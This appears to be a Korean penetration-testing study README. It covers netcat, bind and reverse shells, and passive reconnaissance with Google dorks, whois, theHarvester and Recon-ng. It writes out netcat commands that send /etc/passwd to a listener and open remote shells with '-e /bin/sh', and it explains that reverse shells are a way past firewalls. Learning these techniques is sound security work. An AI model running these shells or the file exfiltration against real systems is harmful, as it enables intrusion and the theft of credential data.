# whitehacker
모의해킹 공부 리포 입니다

## 넷캣 (해킹의 맥가이버 역할)

1) nc -h : 기본옵션확인

2) nc -lvp 4444
l : 리스닝모드 서버로 동작
v: vervus 상태메세지 출력
p : 리스닝시 포트번호 설정

3) nc [로컬ip -> 클라이언트or공격대상?] [공격대상포트번호] : 공격대상에 접속

4) cat /etc/passwd : passwd파일 보기
passwd파일 : 사용자 정보 담겨있음


### “<“ , “>” 꺽새표시의 의미

-nc -lvp 4444 > passwd
4444로 들어오는 정보를 passwd로 전달

-nc -q 0 [로컬ip] [공격대상포트번호] < /etc/passwd
passwd파일의 정보를 클라이언트쪽으로 보내줌\
q : 한번실행하고 명령종료 (여기선 파일 보내고 종료)


## 원격으로 커맨드쉘 생성 (바인드쉘 vs 리버스쉘)
-둘이 나뉘는 이유 : “방화벽”
방화벽은 최전방에서 들어오는 접속을 막지만, 내부에서 외부로 나가는 접속을 막지는 않음. 그래서 리버스쉘을 사용한다.

-공통 : 둘다 공격대상의 쉘에서 -e /bin/sh 입력함

* 바인드쉘 : 타겟 쪽에 서버포트가 열리고 해커쪽에서 타겟으로 접속하여 생성시키는 쉘

(공격대상에서)
1. nc -lvp 4444 -e  /bin/sh
e : 접속이 되고나면 실행할 명령 입력

(우리쪽)

2. nc [로컬ip주소] [포트번호]
하고나면 공격대상 쉘에 접속

* 리버스쉘 : 우리쪽에서 포트를 열고 타겟쪽에서 우리쪽으로 접속시킴
리스닝은 우리쪽에서 하지만 결국엔 우리쪽에서 명령어 입력가능

(우리쪽)
1. nc -lvp [포트번호]

(공격대상)

2. nc [로컬ip] [포트번호] -e /bin/sh\

* sh 명령어
1. id : 사용자 계정정보 확인
2. ip addr : ip주소 확인
3. cat /etc/passwd : 사용자 정보 확인


## 패시브 스캐닝

패시브 스캐닝 : 이미 공개되어 있는 정보 알아냄


-구글 해킹 키워드 정리
* site [사이트주소] : 그 사이트에 대한 정보만 나옴\
추가로 -site [사이트주소] 이 사이트에 대한 정보 만 없음\
추가로 filetype pdf
* inurl:admin : 관리자페이지가 어느사이트 내에 존재하는 지 알수잇음
* intitle: “index of” 취약한 사이트의 디렉토리와 파일들이 의도치않게 공개되는 경우가 있음 그때 웹문서상의 제목이 index of가 됨\
추가로 pdf 붙이면 그 확장자의 파일들 검색 가능
* 추가로 명령어 조사해보기
* exploit-db.com 에서도 google hacking database 볼수있음


-netcraft 사이트 searchdns.netcraft.com
인터넷상의 운용되는 웹서버들에 대한 정보 수집
(언제부터, 서버의 버전 등등)
* [사이트주소] 검색하면 각 서브 도메인 정보얻을 수 있음

-whois 사이트 whois.kisa.or.kr/kor/main.jsp
도메인을 등록할 때의 주소나 담당자 등 정보수집
* [사이트주소 or ip주소]

-이메일 수집
공격대상의 이메일 주소를 알아내기
* 터미널에 theharvester -d [검색할 도메인 이름] -b [사용할 검색엔진]
그 도메인을 사용하는 메일들이나 서브 메일, ip주소까지 확인가능


-Recon-ng
* 터미널에 recon-ng 입력
help : 각종 명령어 나옴\
search : 모듈 위치 확인\
use [실행할 모듈 (위치포함)]

* 모듈
whois_pocs : whois 서버에 공개되어있는 정보확인
bing_domain_web 도메인정보 host

* 모듈 안에서 명령어 ( show)
show option : 어떤 거 설정해야 될지\
show info\
set SOURCE [바꿀소스(도메인)] : 소스바꿈\
run : 모듈 실행\
control + c : 종료\
show contacts : 수집한 이메일, 각종 정보 출력 (whois_pocs)
show hosts (bing_domain_web)
	
	 

